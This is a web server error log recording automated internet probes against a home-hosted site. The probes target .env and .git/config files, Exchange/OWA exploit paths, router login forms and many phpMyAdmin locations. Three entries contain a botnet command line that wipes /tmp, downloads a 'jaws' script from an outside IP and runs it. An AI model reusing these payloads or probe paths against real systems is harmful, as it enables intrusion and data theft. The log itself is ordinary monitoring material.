2023/04/08 23:06:52 [error] 5740#4844: *1543 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/dispatch.asp" failed (2: The system cannot find the file specified), client: 193.32.162.159, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "98.148.80.97"
2023/04/08 23:30:26 [error] 5740#4844: *1558 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/favicon.ico" failed (2: The system cannot find the file specified), client: 64.62.197.185, server: nightcity.digital, request: "GET /favicon.ico HTTP/1.1", host: "98.148.80.97"
2023/04/08 23:31:39 [error] 5740#4844: *1560 "C:\Users\willi\Documents\GitHub\WebServer/html/HNAP1/index.html" is not found (3: The system cannot find the path specified), client: 193.35.18.243, server: localhost, request: "POST /HNAP1/ HTTP/1.1", host: "98.148.80.97:80"
2023/04/08 23:33:42 [error] 5740#4844: *1562 "C:\Users\willi\Documents\GitHub\WebServer/html/geoserver/web/index.html" is not found (3: The system cannot find the path specified), client: 64.62.197.193, server: nightcity.digital, request: "GET /geoserver/web/ HTTP/1.1", host: "98.148.80.97"
2023/04/08 23:33:55 [error] 5740#4844: *1563 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/.git/config" failed (3: The system cannot find the path specified), client: 64.62.197.194, server: nightcity.digital, request: "GET /.git/config HTTP/1.1", host: "98.148.80.97"
2023/04/08 23:39:51 [error] 5740#4844: *1569 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/favicon.ico" failed (2: The system cannot find the file specified), client: 167.248.133.50, server: nightcity.digital, request: "GET /favicon.ico HTTP/1.1", host: "98.148.80.97"
2023/04/09 00:01:54 [error] 5740#4844: *1571 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" failed (3: The system cannot find the path specified), client: 162.243.133.12, server: nightcity.digital, request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1", host: "98.148.80.97"
2023/04/09 00:04:44 [error] 5740#4844: *1572 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/owa/auth/x.js" failed (3: The system cannot find the path specified), client: 198.199.97.240, server: nightcity.digital, request: "GET /owa/auth/x.js HTTP/1.1", host: "98.148.80.97"
2023/04/09 00:07:21 [error] 5740#4844: *1573 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/owa/auth/logon.aspx" failed (3: The system cannot find the path specified), client: 107.170.252.8, server: nightcity.digital, request: "GET /owa/auth/logon.aspx HTTP/1.1", host: "98.148.80.97"
2023/04/09 00:29:43 [error] 5740#4844: *1575 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/dispatch.asp" failed (2: The system cannot find the file specified), client: 193.32.162.159, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "98.148.80.97"
2023/04/09 01:26:10 [error] 5740#4844: *1580 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/favicon.ico" failed (2: The system cannot find the file specified), client: 176.53.221.224, server: nightcity.digital, request: "GET /favicon.ico HTTP/1.1", host: "nightcity.digital"
2023/04/09 01:48:05 [error] 5740#4844: *1592 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/robots.txt" failed (2: The system cannot find the file specified), client: 66.249.73.153, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "nightcity.digital"
2023/04/09 01:50:18 [error] 5740#4844: *1595 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/favicon.ico" failed (2: The system cannot find the file specified), client: 66.249.73.140, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "nightcity.digital"
2023/04/09 02:24:27 [error] 5740#4844: *1599 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/api/v1" failed (3: The system cannot find the path specified), client: 176.113.115.51, server: nightcity.digital, request: "GET /api/v1"
2023/04/09 02:38:21 [error] 5740#4844: *1601 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/boaform/admin/formLogin" failed (3: The system cannot find the path specified), client: 179.43.177.242, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "98.148.80.97:80", referrer: "http://98.148.80.97:80/admin/login.asp"
2023/04/09 03:32:54 [error] 5740#4844: *1604 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/dispatch.asp" failed (2: The system cannot find the file specified), client: 193.32.162.159, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "98.148.80.97"
2023/04/09 03:38:03 [error] 5740#4844: *1605 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/robots.txt" failed (2: The system cannot find the file specified), client: 66.249.73.159, server: nightcity.digital, request: "GET /robots.txt HTTP/1.1", host: "nightcity.digital"
2023/04/09 03:38:05 [error] 5740#4844: *1606 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/favicon.ico" failed (2: The system cannot find the file specified), client: 66.249.73.129, server: nightcity.digital, request: "GET /favicon.ico HTTP/1.1", host: "nightcity.digital"
2023/04/09 03:38:30 [error] 5740#4844: *1610 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/.env" failed (2: The system cannot find the file specified), client: 109.237.98.226, server: localhost, request: "GET /.env HTTP/1.1", host: "98.148.80.97"
2023/04/09 03:57:09 [error] 5740#4844: *1612 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/version" failed (2: The system cannot find the file specified), client: 192.241.214.25, server: nightcity.digital, request: "GET /version HTTP/1.1", host: "98.148.80.97"
2023/04/09 04:11:03 [error] 5740#4844: *1614 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/remote/login" failed (3: The system cannot find the path specified), client: 203.161.32.143, server: nightcity.digital, request: "GET /remote/login HTTP/1.1", host: "98.148.80.97"
2023/04/09 04:12:25 [error] 5740#4844: *1615 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/actuator/gateway/routes" failed (3: The system cannot find the path specified), client: 152.89.196.54, server: nightcity.digital, request: "GET /actuator/gateway/routes HTTP/1.1", host: "98.148.80.97:443"
2023/04/09 04:20:17 [error] 5740#4844: *1617 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/shell" failed (2: The system cannot find the file specified), client: 196.189.200.84, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
2023/04/09 04:52:57 [error] 5740#4844: *1627 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/favicon.ico" failed (2: The system cannot find the file specified), client: 167.94.138.126, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "98.148.80.97"
2023/04/09 05:13:28 [error] 5740#4844: *1632 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/dispatch.asp" failed (2: The system cannot find the file specified), client: 193.32.162.159, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "98.148.80.97"
2023/04/09 06:01:02 [error] 5740#4844: *1633 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/autodiscover/autodiscover.json" failed (3: The system cannot find the path specified), client: 138.68.208.18, server: nightcity.digital, request: "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1", host: "98.148.80.97"
2023/04/09 06:13:44 [error] 5740#4844: *1637 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/shell" failed (2: The system cannot find the file specified), client: 196.188.78.90, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
2023/04/09 06:51:45 [error] 5740#4844: *1651 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/.env" failed (2: The system cannot find the file specified), client: 109.237.97.180, server: nightcity.digital, request: "GET /.env HTTP/1.1", host: "98.148.80.97"
2023/04/09 07:17:04 [error] 5740#4844: *1654 "C:\Users\willi\Documents\GitHub\WebServer/html/HNAP1/index.html" is not found (3: The system cannot find the path specified), client: 193.35.18.243, server: localhost, request: "POST /HNAP1/ HTTP/1.1", host: "98.148.80.97:80"
2023/04/09 07:27:40 [error] 5740#4844: *1655 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/boaform/admin/formLogin" failed (3: The system cannot find the path specified), client: 167.88.61.141, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "98.148.80.97:80", referrer: "http://98.148.80.97:80/admin/login.asp"
2023/04/09 07:28:21 [error] 5740#4844: *1659 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/ab2g" failed (2: The system cannot find the file specified), client: 157.230.127.126, server: nightcity.digital, request: "GET /ab2g HTTP/1.1", host: "98.148.80.97"
2023/04/09 07:28:21 [error] 5740#4844: *1660 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/ab2h" failed (2: The system cannot find the file specified), client: 157.230.127.126, server: nightcity.digital, request: "GET /ab2h HTTP/1.1", host: "98.148.80.97"
2023/04/09 07:28:27 [error] 5740#4844: *1674 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/t4" failed (2: The system cannot find the file specified), client: 157.230.127.126, server: nightcity.digital, request: "GET /t4 HTTP/1.1", host: "98.148.80.97"
2023/04/09 07:28:28 [error] 5740#4844: *1676 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/favicon.ico" failed (2: The system cannot find the file specified), client: 157.230.127.126, server: nightcity.digital, request: "GET /favicon.ico HTTP/1.1", host: "98.148.80.97"
2023/04/09 07:33:52 [error] 5740#4844: *1678 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/dispatch.asp" failed (2: The system cannot find the file specified), client: 193.32.162.159, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "98.148.80.97"
2023/04/09 08:01:10 [error] 5740#4844: *1691 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/robots.txt" failed (2: The system cannot find the file specified), client: 154.209.125.115, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "98.148.80.97:80"
2023/04/09 08:34:40 [error] 5740#4844: *1693 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/boaform/admin/formLogin" failed (3: The system cannot find the path specified), client: 179.43.177.242, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "98.148.80.97:80", referrer: "http://98.148.80.97:80/admin/login.asp"
2023/04/09 09:17:44 [error] 5740#4844: *1694 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/shell" failed (2: The system cannot find the file specified), client: 106.178.221.150, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
2023/04/09 10:08:19 [error] 5740#4844: *1699 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/dispatch.asp" failed (2: The system cannot find the file specified), client: 193.32.162.159, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:44 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/webdb/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/webdb/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:44 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/database/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /database/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:44 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin-5.2.0-all-languages/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:44 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/_phpMyAdmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:44 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/mysql/pma/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /mysql/pma/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:44 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/webadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/webadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/phpmanager/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/phpmanager/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin-5.1.0/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/sqlweb/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/sqlweb/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin_/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/sql/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/sql/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/admin/phpMyAdmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/phpmyadmin5/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:45 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/program/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /program/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/admin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /admin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/mysql/sqlmanager/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/db/dbadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /db/dbadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin-5.1.2/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmy-admin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmy-admin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/_phpmyadmin_/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmyadmin5/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmyadmin5/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/phpmy-admin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:46 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin4/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmyadmin2015/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin2/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/websql/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/websql/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/administrator/admin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /administrator/admin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmy/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmy/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/phpmyadmin3/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmyadmin2017/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:47 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmyadmin2022/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmyadmin2016/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmy/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmy/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/db/webadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /db/webadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/db/phpMyAdmin-3/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/PMA/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /PMA/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/_phpmyadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /_phpmyadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/pma/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /pma/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/mysql-admin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /mysql-admin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:48 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/db/phpMyAdmin-5/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/mysqladmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /mysqladmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin-5.2.0/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/administrator/phpmyadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/myadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/myadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/index.php" failed (2: The system cannot find the file specified), client: 35.72.178.82, server: localhost, request: "GET /index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/sqladmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/sqladmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/administrator/admin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /administrator/admin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:49 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin-4.9.10-all-languages/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/sql/php-myadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmyadmin4/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmyadmin4/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/mysql/web/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /mysql/web/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/administrator/pma/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /administrator/pma/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/myadmin/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /myadmin/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/db/phpMyAdmin-4/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpmyadmin_/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpmyadmin_/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
2023/04/09 10:20:50 [error] 5740#4844: *1701 CreateFile() "C:\Users\willi\Documents\GitHub\WebServer/html/phpMyAdmin-5.1.0/index.php" failed (3: The system cannot find the path specified), client: 35.72.178.82, server: localhost, request: "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1", host: "98.148.80.97"
